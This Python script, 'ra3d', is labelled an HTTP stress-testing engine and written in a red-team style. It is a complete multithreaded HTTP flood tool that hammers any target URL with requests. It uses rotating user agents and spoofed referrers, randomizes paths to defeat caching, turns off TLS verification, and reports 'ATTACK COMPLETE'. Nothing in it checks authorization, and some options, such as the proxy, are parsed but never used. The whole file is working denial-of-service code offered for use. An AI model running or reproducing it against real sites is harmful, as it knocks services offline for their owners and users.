#!/usr/bin/env python3
"""
ra3d (رعد) v1.0 — HTTP Stress Testing Engine
Author: @mb7 | Red Team Style
"""

import os, sys, time, random, json, signal, socket, ssl, threading, shutil
from datetime import datetime, timedelta
from urllib.parse import urlparse, urlencode
from collections import deque

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
W = "\033[97m"; D = "\033[90m"; N = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.2210.91",
    "curl/8.4.0",
    "Python-urllib/3.9",
    "Go-http-client/2.0",
]

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://t.co/",
    "https://www.facebook.com/", "https://twitter.com/", "https://www.linkedin.com/",
    "https://www.reddit.com/", "https://t.me/", "https://www.instagram.com/",
]

ACCEPT = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.succeeded = 0
        self.failed = 0
        self.timeouts = 0
        self.conn_refused = 0
        self.other_errors = 0
        self.bytes_sent = 0
        self.bytes_recv = 0
        self.status_counts = {}
        self.times = deque(maxlen=10000)
        self.rps_history = deque(maxlen=60)
        self.start_time = time.time()

    def add(self, status, duration, sent, recv):
        with self.lock:
            self.sent += 1
            self.bytes_sent += sent
            self.bytes_recv += recv
            self.times.append(duration)
            if duration > 30: self.timeouts += 1
            if status == -1: self.conn_refused += 1
            elif status == -2: self.other_errors += 1
            elif status < 200 or status >= 600: self.other_errors += 1
            else: self.succeeded += 1
            self.status_counts[status] = self.status_counts.get(status, 0) + 1

    def rps(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            return self.sent / elapsed if elapsed > 0 else 0

    def avg_time(self):
        with self.lock:
            if not self.times: return 0
            return sum(self.times) / len(self.times)

def build_headers(target_url, custom_hdrs=None, ua=None, ref=None):
    if custom_hdrs is None: custom_hdrs = {}
    p = urlparse(target_url)
    h = {
        "Host": p.netloc,
        "User-Agent": ua or random.choice(USER_AGENTS),
        "Accept": random.choice(ACCEPT),
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Referer": ref or random.choice(REFERRERS),
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    h.update(custom_hdrs)
    return h

def attack_worker(target, args, stats, stop_event):
    ua = urlparse(target)
    port = ua.port or (443 if ua.scheme == "https" else 80)
    is_ssl = ua.scheme == "https"
    path = ua.path or "/"
    if ua.query: path += "?" + ua.query

    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(args.timeout)
            if is_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=ua.hostname)
            sock.connect((ua.hostname, port))

            use_path = path
            if args.random_url:
                use_path = f"/{random.randint(100000,999999)}{random.choice(['','.php','.html','.asp','/'])}"

            method = random.choice(args.methods) if args.methods else "GET"
            hdrs = build_headers(target)
            body = ""
            if args.body:
                body = args.body.replace("{rand}", str(random.randint(1,99999)))
            elif method == "POST" and not args.body:
                body = f"data={random.randint(1,99999)}&t={time.time()}"

            req = f"{method} {use_path} HTTP/1.1\r\n"
            for k, v in hdrs.items():
                req += f"{k}: {v}\r\n"
            if body:
                req += f"Content-Length: {len(body)}\r\n"
            req += "\r\n" + body

            sent = len(req)
            t0 = time.time()
            sock.sendall(req.encode())

            resp = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    resp += chunk
                    if b"\r\n\r\n" in resp:
                        header_end = resp.find(b"\r\n\r\n") + 4
                        cl = 0
                        for line in resp[:header_end].split(b"\r\n"):
                            if line.lower().startswith(b"content-length:"):
                                cl = int(line.split(b":")[1].strip())
                                break
                        if len(resp[header_end:]) >= cl:
                            break
                except: break

            t1 = time.time()
            status = -2
            if resp:
                try: status = int(resp.split(b" ")[1])
                except: status = -2
            recv = len(resp)
            stats.add(status, t1 - t0, sent, recv)
            sock.close()

        except socket.timeout: stats.add(-1, time.time() - t0 if 't0' in dir() else 30, 0, 0)
        except ConnectionRefusedError: stats.add(-1, 0, 0, 0)
        except Exception: stats.add(-2, 0, 0, 0)

        if args.delay > 0: time.sleep(args.delay / 1000)

def display(stats, args, stop_event):
    while not stop_event.is_set():
        elapsed = time.time() - stats.start_time
        rps = stats.rps()

        with stats.lock:
            total = stats.sent
            good = stats.succeeded
            bad = stats.failed + stats.timeouts + stats.conn_refused + stats.other_errors
            avg = stats.avg_time()
            b_sent = stats.bytes_sent
            b_recv = stats.bytes_recv
            recent_times = list(stats.times)
            sc = dict(stats.status_counts)

        stats.rps_history.append(rps)
        if args.max_requests and total >= args.max_requests:
            stop_event.set(); return
        if args.max_time and elapsed >= args.max_time:
            stop_event.set(); return

        if args.quiet: time.sleep(1); continue

        os.system("clear")
        print(f"{R}")
        print(f"  {'╔' + '═'*46 + '╗'}")
        print(f"  {'║'}{' '*18}رعد{R}{' '*18}║")
        print(f"  {'║'}{' '*7}RA3D - HTTP STRESS ENGINE{' '*7}║")
        print(f"  {'╚' + '═'*46 + '╝'}{N}")
        print()

        print(f"  {R}┌{'─'*46}┐{N}")
        print(f"  {R}│{N}  Target:     {C}{args.target[:50]}{N}")
        print(f"  {R}│{N}  Methods:    {Y}{','.join(args.methods)}{N}")
        print(f"  {R}│{N}  Threads:    {M}{args.threads}{N}")
        print(f"  {R}│{N}  Duration:   ", end="")
        if args.max_time:
            remaining = max(0, args.max_time - elapsed)
            print(f"{Y}{timedelta(seconds=int(remaining))}{N}")
        elif args.max_requests:
            remaining = max(0, args.max_requests - total)
            print(f"{Y}{remaining} reqs left{N}")
        else: print(f"{D}inf{N}")
        print(f"  {R}└{'─'*46}┘{N}")
        print()

        spk = "▁▂▃▄▅▆▇█"
        hist = list(stats.rps_history)
        if len(hist) > 1:
            mx = max(hist) if max(hist) > 0 else 1
            bars = "".join(spk[min(int(v/mx*7), 7)] for v in hist[-50:])
            print(f"  {R}┌{'─'*46}┐{N}")
            print(f"  {R}│{N}  RPS Trend:  {D}{bars}{N}")
            print(f"  {R}│{N}  Current:   {G}{rps:>8.1f}{N} req/s     Avg: {C}{rps:>8.1f}{N}")
            print(f"  {R}│{N}  Total:     {B}{total:>8,}{N} req     Time: {Y}{timedelta(seconds=int(elapsed))}{N}")
            print(f"  {R}│{W}  {'-'*44}{N}")
            print(f"  {R}│{N}  Avg time:  {Y}{avg*1000:>7.2f}{N} ms")
            if recent_times:
                print(f"  {R}│{N}  Min/Max:   {D}{min(recent_times)*1000:.1f}{N} / {D}{max(recent_times)*1000:.1f}{N} ms")
                sorted_t = sorted(recent_times)
                p50 = sorted_t[len(sorted_t)//2]
                p95 = sorted_t[int(len(sorted_t)*0.95)]
                p99 = sorted_t[int(len(sorted_t)*0.99)]
                print(f"  {R}│{N}  P50/P95/P99: {D}{p50*1000:.1f}{N}/{D}{p95*1000:.1f}{N}/{D}{p99*1000:.1f}{N} ms")
            print(f"  {R}│{W}  {'-'*44}{N}")
            print(f"  {R}│{N}  Sent:     {M}{b_sent/1024:>8.1f}{N} KB      Recv: {M}{b_recv/1024:>8.1f}{N} KB")
            print(f"  {R}│{W}  {'-'*44}{N}")
            print(f"  {R}│{N}  OK:       {G}{good:>7,}{N}           Fail: {R}{bad:>7,}{N}")
            for code, cnt in sorted(sc.items()):
                if code < 0: continue
                clr = G if code < 300 else (Y if code < 400 else (M if code < 500 else R))
                print(f"  {R}│{N}  HTTP {code}:  {clr}{cnt:>7,}{N}")
            if bad > 0:
                print(f"  {R}│{N}  Errors:    {R}{bad:>7,}{N}")
                if stats.timeouts > 0: print(f"  {R}│{N}     timeout:{R}{stats.timeouts:>6,}{N}")
                if stats.conn_refused > 0: print(f"  {R}│{N}     refused:{R}{stats.conn_refused:>6,}{N}")
                if stats.other_errors > 0: print(f"  {R}│{N}     other:{R}{stats.other_errors:>6,}{N}")
            print(f"  {R}└{'─'*46}┘{N}")
        print()
        print(f"  {DIM}Press Ctrl+C to stop{N}")

        time.sleep(1)

def main():
    import argparse as ap
    p = ap.ArgumentParser(prog="ra3d", formatter_class=ap.RawTextHelpFormatter)

    p.add_argument("target", help="Target URL")
    p.add_argument("-t", "--threads", type=int, default=50, help="Threads (default: 50)")
    p.add_argument("-m", "--methods", nargs="+", default=["GET"], help="HTTP methods: GET POST PUT DELETE PATCH")
    p.add_argument("-d", "--delay", type=int, default=0, help="Delay between requests (ms)")
    p.add_argument("--timeout", type=int, default=10, help="Request timeout (s, default: 10)")

    dur = p.add_mutually_exclusive_group()
    dur.add_argument("-n", "--max-requests", type=int, help="Max requests (stop after N)")
    dur.add_argument("--time", type=int, dest="max_time", help="Duration in seconds")

    p.add_argument("--body", help="Request body (use {rand} for random)")
    p.add_argument("--header", action="append", help="Custom header (repeatable)")
    p.add_argument("--cookie", help="Cookie header value")
    p.add_argument("--random-url", action="store_true", help="Randomize URL path")
    p.add_argument("-q", "--quiet", action="store_true", help="Disable live display")
    p.add_argument("--proxy", help="Proxy (http://user:pass@host:port)")

    args = p.parse_args()
    if isinstance(args.methods, str):
        args.methods = [args.methods]
    args.methods = [m.upper() for m in args.methods]

    for m in args.methods:
        if m not in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
            print(f"{R}[x]{N} Invalid method: {m}"); sys.exit(1)

    if args.max_requests and args.max_requests < args.threads:
        print(f"{R}[x]{N} max-requests must be >= threads"); sys.exit(1)

    stats = Stats()
    stop_event = threading.Event()

    signal.signal(signal.SIGINT, lambda s, f: stop_event.set())

    workers = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_worker, args=(args.target, args, stats, stop_event), daemon=True)
        workers.append(t)

    disp = threading.Thread(target=display, args=(stats, args, stop_event), daemon=True)

    os.system("clear")
    print(f"\n  {R}ra3d{R}{DIM} - Launching {args.threads} threads on {C}{args.target}{N}")
    print(f"  {R}{'-'*50}{N}\n")

    for w in workers: w.start()
    disp.start()

    start = time.time()
    try:
        for w in workers: w.join()
    except KeyboardInterrupt:
        stop_event.set()

    elapsed = time.time() - start
    total = stats.sent
    rps = total / elapsed if elapsed > 0 else 0

    os.system("clear")
    print(f"\n{R}{'='*54}{N}")
    print(f"{R}{'╔'}{'='*52}{'╗'}{N}")
    print(f"{R}{'║'}{N}  {BOLD}ATTACK COMPLETE{R}  {' '*29}{R}{'║'}{N}")
    print(f"{R}{'╠'}{'='*52}{'╣'}{N}")
    print(f"{R}{'║'}{N}  Target:      {C}{args.target}{N}")
    print(f"{R}{'║'}{N}  Duration:    {Y}{elapsed:.1f}s{N}")
    print(f"{R}{'║'}{N}  Threads:     {M}{args.threads}{N}")
    print(f"{R}{'║'}{N}  Total req:   {B}{total:,}{N}")
    print(f"{R}{'║'}{N}  RPS:         {G}{rps:.1f}{N}")
    print(f"{R}{'╠'}{'='*52}{'╣'}{N}")
    avg = stats.avg_time()
    print(f"{R}{'║'}{N}  Avg time:    {Y}{avg*1000:.2f}{N} ms")
    print(f"{R}{'║'}{N}  Success:     {G}{stats.succeeded:,}{N}")
    print(f"{R}{'║'}{N}  Failed:      {R}{stats.failed + stats.timeouts + stats.conn_refused + stats.other_errors:,}{N}")
    for code, cnt in sorted(stats.status_counts.items()):
        if code < 0: continue
        clr = G if code < 300 else (Y if code < 400 else (M if code < 500 else R))
        print(f"{R}{'║'}{N}  HTTP {code}:     {clr}{cnt:,}{N}")
    print(f"{R}{'║'}{N}  Sent:        {M}{stats.bytes_sent/1024:.1f}{N} KB")
    print(f"{R}{'║'}{N}  Recv:        {M}{stats.bytes_recv/1024:.1f}{N} KB")
    print(f"{R}{'╚'}{'='*52}{'╝'}{N}")
    print(f"{R}{'='*54}{N}\n")

if __name__ == "__main__":
    main()
